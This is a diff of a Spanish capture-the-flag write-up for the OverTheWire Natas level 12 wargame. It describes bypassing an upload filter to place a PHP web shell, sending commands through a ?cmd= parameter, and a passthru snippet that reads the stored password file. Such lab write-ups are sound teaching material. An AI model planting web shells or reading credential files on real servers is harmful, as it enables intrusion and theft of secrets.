@@ -205,6 +205,8 @@ Le damos a **Forward** en **BURP** y nos indica que hemos **subido correctamente
 The file upload/ujofljdn2f.php has been uploaded
 ```
 
+**¡BIEN!** ¡Hemos podido saltarnos el filtro y subido una **Shell** al Servidor! :smile:
+
 Entramos en la **URL** que nos han proporcionado y nos muestra este mensaje:
 
 ```php
@@ -214,8 +216,30 @@ Warning: passthru(): Cannot execute a blank command in /var/www/natas/natas12/up
 
 Nos dice que no puede **ejecutar** un **comando en blanco**, por lo tanto **si** podemos enviarle comandos a través de la **URL**! :smile:
 
-Montamos la **URL**
+Montamos la **URL** y le pasamos los comandos con la opción de:
+```html
+?cmd=<comando>
+````
 
+quedando la URL completa así:
+
+```html
+http://natas12.natas.labs.overthewire.org/upload/ujofljdn2f.php?cmd=<comando>
+```
+
+Sabemos que la contraseña estará en la siguiente ubicación, por los niveles anteriores:
+
+```bash
+cat /etc/natas_webpass/natas12
+```
+
+Por alguna razón no me deja ejecutar los comandos que le paso desde el navegador así que modifico directamente el código para que me muestre la contraseña del siguiente nivel.
+
+```php
+<?php
+ passthru("cat /etc/natas_webpass/natas12");  
+?>
+```
 
 
  
